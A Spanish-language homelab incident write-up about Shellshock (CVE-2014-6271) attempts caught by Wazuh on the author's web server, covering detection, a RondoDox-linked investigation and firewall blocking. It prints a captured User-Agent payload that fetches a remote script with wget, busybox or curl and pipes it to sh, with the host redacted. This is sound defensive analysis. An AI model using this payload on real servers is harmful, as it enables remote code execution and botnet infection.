---
title: Shellshock
description: Ataque automatizado hacia esta página.
published: true
date: 2025-11-18T13:53:14.226Z
tags: 
editor: markdown
dateCreated: 2025-11-18T12:11:39.089Z
---

# Shellshock: Una vulnerabilidad del pasado todavía vigente.
> Aviso Legal: Este análisis contiene información sobre infraestructura maliciosa real. Las direcciones IP y dominios han sido ofuscados (defanged) para seguridad del lector. La IP atacante ha sido reportada a las autoridades competentes (AbuseIPDB). {.is-warning}

## Introducción y Detección
La infraestructura que aloja este sitio web está monitorizada por un sistema de seguridad, para análisis y seguridad defensiva. En estas últimas semanas, se ha detectado mediante el sistema SIEM (**WAZUH**), una serie de intentos de explotación dirigidos contra mi servidor web.

En este informe hablaremos sobre la detección, análisis y actuación ante la vulnerabilidad **Shellshock (CVE-2014-6271)** [Información del CVE-2014-6271 aportado por el NIST](https://nvd.nist.gov/vuln/detail/cve-2014-6271).

![Información de nivel critico en Wazuh](/imagenes/imagen_shellshock_1.png)
## La vulnerabilidad Shellshock (CVE 2014-6271)
Aunque esta vulnerabilidad es de hace ya más de 10 años, sigue siendo un vector de entrada crítico con las siguientes puntuaciones:
- CVSS v3: 9.8
- Vector de ataque: Network (Red).
- Complejidad del ataque: Bajo.
- Privilegios necesarios: Ninguno.
- Interacción del usuario: Ninguno.
- Scope: Sin cambios.
- Confidencialidad: Altamente atacada.
- Integridad: Altamente atacada.
- Disponibilidad: Altamente atacada.
- Impacto: Ejecución de código remoto.

### ¿Cómo funciona?
La vulnerabilidad reside en cómo procesa GNU Bash las definiciones de variables de entorno. Un atacante puede inyectar código de forma remota si tras la definición de una función legítima, pone comandos, es decir:
```GNU Bash
VAR='() { :; }; comandos'
```

Si un servicio web procesa estas variables, Bash podría ejecutar "comandos" de forma directa, generando grandes agujeros de seguridad.

## Arquitectura de detección
Para el análisis de este incidente, es importante explicar la arquitectura de seguridad en mi laboratorio:
- SIEM: Wazuh (Correlación de eventos y alertas)
- IDS: Suricata (Comprueba firmas de red y envia alertas a Wazuh)
- Perímetro: Se tiene tanto un proxy inverso como un firewall para imponer reglas de bloqueo a estas IPs.
- Investigación: Con una máquina virtual desechable Kali y enrutamiento con TOR.


## Análisis Forense del Incidente
Wazuh hizo saltar una alerta, que tiene predeterminada, con ID **31168**, donde interceptó múltiples peticiones HTTP con un patrón anómalo en la cabecera User-Agent.
**Payload Capturado:**
```html
"GET / HTTP/1.1" 301 169 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://[IP Maliciosa]/[Archivo malicioso]||busybox wget -qO- http://[IP Maliciosa]/[Archivo malicioso]||curl -s http://[IP Maliciosa]/[Archivo malicioso])|sh\x22& # Un correo del atacante"
```
Desglose del ataque.
- Exploit: La inyección comienza con  "() {: ;};", como hemos explicado anteriormente hace uso de variables del entorno para poder atacar, aprovechando la vulnerabilidad Shellshock.
- Ataque: Acto seguido lo que hace es descargar un script externo y ejecutarlo. Hace 3 intentos, para distintos sistemas Linux o IoT, por eso podemos ver "wget" "busybox" o "curl".
![Información de logs en Wazuh](/imagenes/imagen_shellshock_2.png)
## Investigación
Para analizar el comportamiento del malware, sin comprometernos nosotros mismos, se ha extraído el contenido del fichero con una máquina virtual desechable Kali y con la red TOR, para proteger la identidad.

Al descargar el archivo, descubrí que el servidor devolvió un documento HTML, con el siguiente contenido:
- Una página web con un vídeo de fondo.
- Un botón falso.
- Una dirección de correo visible en el código fuente.

Accediendo mediante la red TOR, podemos comprobar toda la información anterior.

Analizada la información recibida, se han sacado las siguientes conclusiones.
1. Campaña RondoDox: El nombre del supuesto script, que intenta descargar se llama "rondo.qre.sh", que tiene similitud a la botnet RondoDox.
2. Correo del actor: Tanto en la fuente de la página como en el ataque, podemos encontrar una dirección de correo.
3. Posible trolling: El website parece que se creó para hacer trolling y no para difundir un malware.
![Información de VirusTotal.](/imagenes/imagen_shellshock_3.png)
## Mitigación y respuesta
Actualmente, la mitigación se realiza mediante bloqueo proactivo en el firewall.

Sin embargo, en un futuro se implementará un **SOAR**, con **n8n**, con el objetivo de informar y bloqueo automático en el firewall.

> Las IPs han sido reportadas a AbuseIPDB.
{.is-info}

## Agradecimientos
Muchas gracias a los que se hayan quedado hasta el final de este corto relato en mi homelab casero, cualquier recomendación o comentario es bienvenido en mi cuenta de LinkedIn.
- [LinkedIn](https://www.linkedin.com/in/pablosanchezhidalgo/)